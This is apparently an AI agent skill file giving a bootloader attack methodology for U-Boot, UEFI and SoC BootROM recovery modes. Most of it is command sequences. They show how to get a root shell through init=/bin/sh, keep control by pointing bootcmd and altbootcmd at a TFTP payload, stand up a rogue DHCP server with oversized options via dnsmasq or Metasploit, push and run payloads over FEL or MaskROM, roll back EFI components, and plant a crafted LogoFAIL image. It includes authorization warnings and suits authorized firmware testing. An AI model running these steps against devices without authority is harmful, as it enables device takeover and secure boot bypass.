---
name: bootloader-testing
description: Security testing for bootloaders including U-Boot, UEFI, and SoC ROM recovery modes. Use this skill whenever you need to test device startup configurations, assess secure boot protections, exploit bootloader vulnerabilities, or perform firmware security assessments. Trigger this skill for any bootloader analysis, U-Boot environment manipulation, UEFI/ESP tampering, network boot testing, or SoC recovery mode exploitation tasks.
---

# Bootloader Security Testing

A comprehensive skill for testing and exploiting bootloader vulnerabilities in embedded and PC-class systems.

## When to use this skill

Use this skill when you need to:
- Test U-Boot environments and modify boot configurations
- Assess secure boot and signature verification mechanisms
- Exploit network boot vulnerabilities (DHCP/PXE)
- Leverage SoC ROM recovery modes for early code execution
- Test UEFI/ESP tampering and rollback protections
- Perform firmware security assessments on embedded devices

## U-Boot Testing

### Access the U-Boot Shell

Interrupt the boot process to gain access to the U-Boot interpreter:

1. **Break into U-Boot**: During boot, press a key before `bootcmd` executes. Common break keys:
   - Any key (if `bootdelay > 0`)
   - Spacebar
   - `0`
   - Board-specific magic sequences

2. **Inspect boot state**:
   ```bash
   printenv          # Dump all environment variables
   bdinfo            # Board info and memory addresses
   help bootm        # Kernel boot methods
   help booti        # ARM64 boot method
   help bootz        # ARM boot method
   help ext4load     # Filesystem loaders
   help fatload      # FAT filesystem loader
   help tftpboot     # Network boot loader
   ```

### Modify Boot Arguments for Root Shell

Gain a root shell by modifying kernel boot arguments:

```bash
# View current boot configuration
printenv

# Modify bootargs to drop to shell
setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=ext4 init=/bin/sh'

# Persist changes (if env is writable)
saveenv

# Reboot with new configuration
boot
# or
run bootcmd
```

### Network Boot from TFTP Server

Configure the device to boot from your TFTP server:

```bash
# Set network configuration
setenv ipaddr 192.168.2.2      # Device IP
setenv serverip 192.168.2.1    # TFTP server IP
setenv netmask 255.255.255.0

# Persist and reset
saveenv
reset

# Verify connectivity
ping ${serverip}

# Load kernel and device tree
tftpboot ${loadaddr} zImage
tftpboot ${fdt_addr_r} devicetree.dtb

# Boot with shell access
setenv bootargs "${bootargs} init=/bin/sh"
booti ${loadaddr} - ${fdt_addr_r}
```

### Persist Boot Control

If environment storage is writable, establish persistent control:

```bash
# Override boot command to load from network
setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
saveenv

# Check for fallback mechanisms
printenv | grep -E 'bootcount|bootlimit|altbootcmd|boot_targets'

# Exploit misconfigured boot limits
setenv bootcount 0
setenv bootlimit 1
setenv altbootcmd 'tftpboot ${loadaddr} payload.bin; bootm ${loadaddr}'
saveenv
```

### Check for Debug/Unsafe Features

Look for these indicators of weak security:

```bash
# Check boot delay (allows interruption)
printenv | grep bootdelay

# Check for disabled autoboot
printenv | grep autoboot

# Check USB loading capabilities
usb start
fatload usb 0:1 ${loadaddr} test.bin

# Check serial loading
loady ${loadaddr}  # XMODEM
loads ${loadaddr}  # YMODEM

# Check environment import from untrusted media
env import -t ${loadaddr}  # Import from RAM

# Check for signature verification
printenv | grep -i verify
```

### Test FIT Image Verification

If the platform claims secure boot with FIT images:

```bash
# Test unsigned image (should fail if secure boot enforced)
tftpboot ${loadaddr} fit-unsigned.itb
bootm ${loadaddr}

# Test tampered signed image
tftpboot ${loadaddr} fit-signed-badhash.itb
bootm ${loadaddr}

# Test valid signed image
tftpboot ${loadaddr} fit-signed.itb
bootm ${loadaddr}

# Check for signature configuration
printenv | grep -i fit
```

## Network Boot Vulnerability Testing

### DHCP/PXE Parameter Fuzzing

U-Boot's DHCP handling has had memory-safety issues. Test with crafted responses:

```bash
# Run the DHCP fuzzing script
python3 scripts/dhcp_fuzzer.py --interface eth0 --target-mac aa:bb:cc:dd:ee:ff
```

The script tests:
- Oversized bootfile-name (option 67)
- Malformed vendor options
- Edge-case DHCP parameters
- Memory disclosure attempts (CVE-2024-42040)

### Rogue DHCP Server Testing

Set up a rogue DHCP/PXE service to test command injection:

```bash
# Using dnsmasq with custom options
dnsmasq --dhcp-range=192.168.2.100,192.168.2.200 \
        --dhcp-boot=malicious-payload.bin \
        --dhcp-option=option:vendor-class-id,"$(python3 -c "print('A'*240)")" \
        --interface=eth0

# Using Metasploit
use auxiliary/server/dhcp
set SRVHOST 192.168.2.1
set BOOTFILE malicious.bin
run
```

## SoC ROM Recovery Modes

Many SoCs expose BootROM modes that execute code over USB/UART before flash verification:

### NXP i.MX (Serial Download Mode)

```bash
# Using uuu (mfgtools3)
uuu -v -b u-boot.imx

# Using imx-usb-loader
imx-usb-loader u-boot.imx

# Push and execute from RAM
imx-usb-loader -b 0x80000000 payload.bin
```

### Allwinner (FEL Mode)

```bash
# Load U-Boot to RAM
sunxi-fel -v uboot u-boot-sunxi-with-spl.bin

# Write and execute payload
sunxi-fel write 0x4A000000 payload.bin
sunxi-fel exe 0x4A000000

# Dump memory
sunxi-fel dump 0x40000000 0x1000000 dump.bin
```

### Rockchip (MaskROM Mode)

```bash
# Download loader
rkdeveloptool db loader.bin

# Upload and boot U-Boot
rkdeveloptool ul u-boot.bin

# Write to flash
rkdeveloptool wf u-boot.bin
```

**Critical**: Check if secure-boot eFuses/OTP are burned. If not, BootROM modes bypass all higher-level verification.

## UEFI/PC-Class Bootloader Testing

### ESP Tampering and Rollback

```bash
# Mount EFI System Partition
mount /dev/sdX1 /mnt/efi

# Check boot components
ls -la /mnt/efi/EFI/BOOT/
ls -la /mnt/efi/EFI/Microsoft/Boot/
ls -la /mnt/efi/EFI/ubuntu/

# Key files to examine:
# - BOOTX64.efi (default bootloader)
# - bootmgfw.efi (Windows boot manager)
# - shimx64.efi (Secure Boot shim)
# - grubx64.efi (GRUB bootloader)

# Test with downgraded components
# Copy known-vulnerable signed bootloaders to ESP
# Reboot and check if platform accepts them
```

### Boot Logo Parsing Vulnerabilities (LogoFAIL)

Test for image parsing bugs in boot logo handling:

```bash
# Check for writable logo paths
ls -la /mnt/efi/EFI/*/logo/
ls -la /mnt/efi/EFI/*/images/

# Place crafted BMP image
cp malicious_logo.bmp /mnt/efi/EFI/<vendor>/logo/

# Reboot and monitor for code execution
```

## Environment Manipulation Techniques

### Export/Import Environment Blobs

```bash
# Export environment to RAM
env export -t ${loadaddr}

# Import from RAM (may allow unauthenticated import)
env import -t ${loadaddr}

# Export to file for analysis
md ${loadaddr} 0x1000 > env_dump.txt
```

### Linux Boot Partition Persistence

For systems using extlinux:

```bash
# Mount boot partition
mount /dev/mtdblockX /mnt/boot

# Modify extlinux.conf
# Add to APPEND line:
# init=/bin/sh or rd.break

# Example:
# APPEND root=/dev/mmcblk0p2 rw init=/bin/sh
```

### fw_printenv/fw_setenv Validation

```bash
# Check configuration
/etc/fw_env.config

# Verify offsets match actual MTD regions
cat /proc/mtd

# Misconfigured offsets may allow writing wrong regions
fw_printenv
fw_setenv test_key test_value
```

## Safety Warnings

⚠️ **Hardware Caution**:
- Be extremely careful when grounding SPI/NAND flash pins
- Consult flash datasheets before any hardware manipulation
- Mistimed shorts can permanently corrupt devices
- Always work on isolated lab networks for network boot testing

⚠️ **Legal Considerations**:
- Only test devices you own or have explicit authorization to test
- Document all testing activities
- Restore devices to original state after testing

## Quick Reference Commands

```bash
# U-Boot essentials
printenv
setenv <key> <value>
saveenv
reset
boot

# Network boot
setenv ipaddr <ip>
setenv serverip <ip>
tftpboot ${loadaddr} <file>

# File operations
fatload usb 0:1 ${loadaddr} <file>
ext4load mmc 0:1 ${loadaddr} <file>

# Memory operations
md <addr> <count>    # Memory display
mw <addr> <count> <value>  # Memory write
```

## References

- [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [LogoFAIL: Image Parsing Dangers](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [CVE-2024-42040: U-Boot DHCP Memory Disclosure](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [MediaTek Secure Boot Bypass](android-mediatek-secure-boot-bl2_ext-bypass-el3.md)
